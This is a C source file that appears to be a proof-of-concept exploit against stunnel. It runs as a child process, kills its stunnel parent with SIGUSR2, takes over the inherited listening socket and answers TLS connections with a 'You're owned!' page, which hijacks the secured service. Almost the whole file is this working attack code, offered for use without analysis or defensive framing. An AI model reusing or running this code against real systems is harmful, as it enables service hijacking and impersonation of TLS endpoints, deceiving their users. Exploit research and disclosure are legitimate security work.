#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <openssl/ssl.h>

/*
 * The basic scheme goes like this:
 *      1) Get rid of the parent
 *      2) init the openssl library
 *      3) start handling requests
 */

/* You may need to adjust these next 3 items */
#define LISTEN_DESCRIPTOR 6
#define CERTF "/opt/stunnel-sploit/foo-cert.pem"
#define KEYF  "/opt/stunnel-sploit/foo-cert.pem"

static SSL_CTX    *ctx;
static SSL        *ssl;
static X509       *client_cert;
static SSL_METHOD *meth;

static void server_loop(int descr);
static void ssl_init(void);

int main(int argc, char *argv[])
{
    int pid = getppid();

    /* Need to fork so stunnel doesn't kill us */
    if (fork() == 0) {
        /* Become session leader */
        setsid();

        /* Goodbye - thanks for the descriptor */
        kill(pid, SIGUSR2);
        close(0); close(1); close(2);
        ssl_init();
        server_loop(LISTEN_DESCRIPTOR);
    }
    return 0;
}

static void server_loop(int descr)
{
    struct timeval   tv;
    fd_set read_mask ;

    FD_SET(descr, &read_mask);
    for (;;) {
        struct sockaddr_in remote;
        socklen_t len = sizeof(remote);
        int fd;

        if (select(descr+1, &read_mask, NULL, NULL, 0 )
== -1)
            continue;
        fd = accept(descr, &remote, &len);
        if (fd >=0) {
            char obuf[4096];

            if ((ssl = SSL_new (ctx)) != NULL) {
                SSL_set_fd (ssl, fd);
                SSL_set_accept_state(ssl);
                if ((SSL_accept (ssl)) == -1)
                    exit(1);
                strcpy(obuf, "HTTP/1.0 200 OK\n");
                strcat(obuf, "Content-Length: 40\n");
                strcat(obuf, "Content-Type:
text/html\n\n");
                strcat(obuf, "<html><body>You're
owned!</body></html>");
                SSL_write (ssl, obuf, strlen(obuf));
                SSL_set_shutdown(ssl,
SSL_SENT_SHUTDOWN|SSL_RECEIVED_SHUTDOWN);
                SSL_free (ssl);
                ERR_remove_state(0);
            }
            close(fd);
        }
    }
    SSL_CTX_free (ctx);  /* Never gets called */
}

static void ssl_init(void)
{
    SSL_load_error_strings();
    SSLeay_add_ssl_algorithms();
    meth = SSLv23_server_method();
    ctx = SSL_CTX_new (meth);
    if (!ctx)
        exit(1);
    if (SSL_CTX_use_certificate_file(ctx, CERTF,
SSL_FILETYPE_PEM) <= 0)
        exit(1);
    if (SSL_CTX_use_PrivateKey_file(ctx, KEYF,
SSL_FILETYPE_PEM) <= 0)
        exit(1);
    if (!SSL_CTX_check_private_key(ctx))
        exit(1);
}


